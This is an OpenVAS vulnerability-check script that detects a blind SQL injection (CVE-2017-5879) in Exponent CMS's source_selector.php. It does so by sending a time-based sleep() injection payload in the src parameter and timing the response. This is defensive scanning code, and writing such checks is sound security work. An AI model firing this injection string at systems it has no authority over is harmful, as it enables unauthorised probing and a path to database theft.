###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_exponent_cms_96039.nasl 12021 2018-10-22 14:54:51Z mmartin $
#
# Exponent CMS 'source_selector.php' SQL Injection Vulnerability
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:exponentcms:exponent_cms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108077");
  script_version("$Revision: 12021 $");
  script_cve_id("CVE-2017-5879");
  script_bugtraq_id(96039);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 16:54:51 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-02-08 11:31:19 +0100 (Wed, 08 Feb 2017)");
  script_name("Exponent CMS 'source_selector.php' SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_exponet_cms_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ExponentCMS/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/96039");
  script_xref(name:"URL", value:"https://github.com/exponentcms/exponent-cms/issues/73");
  script_xref(name:"URL", value:"http://www.exponentcms.org/news/patch-2-released-for-v2-4-1");

  script_tag(name:"summary", value:"This host is installed with Exponent CMS
  and is prone to a sql injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check the response time.");

  script_tag(name:"insight", value:"The vulnerability is a blind SQL injection that can be
  exploited by un-authenticated users via an HTTP GET request and affects source_selector.php
  and the following parameter: src.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to e.g dump database data out to a malicious server, using an
  out-of-band technique, such as select_loadfile().");

  script_tag(name:"affected", value:"Exponent CMS 2.4.1 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"Update to version 2.4.1 Patch #2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

# Latency check
req = http_get( item: dir + "/source_selector.php?controller=blog&action=showall&src=@random", port:port );
start = unixtime();
res = http_keepalive_send_recv( port:port, data:req );
stop = unixtime();
latency = stop - start;

count = 0;

foreach sleep( make_list( 3, 5 ) ) {

  url = dir + "/source_selector.php?controller=blog&action=showall&src='%20and%20(select+sleep(2)%20from(select(sleep(" + sleep + ")))a)--%20";

  req = http_get( item:url, port:port );
  start = unixtime();
  res = http_keepalive_send_recv( port:port, data:req );
  stop = unixtime();

  if( stop - start < sleep || stop - start > ( sleep + 20 + latency ) ) {
    exit( 0 );
  } else {
    count += 1;
  }
}

if( count == 2 ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
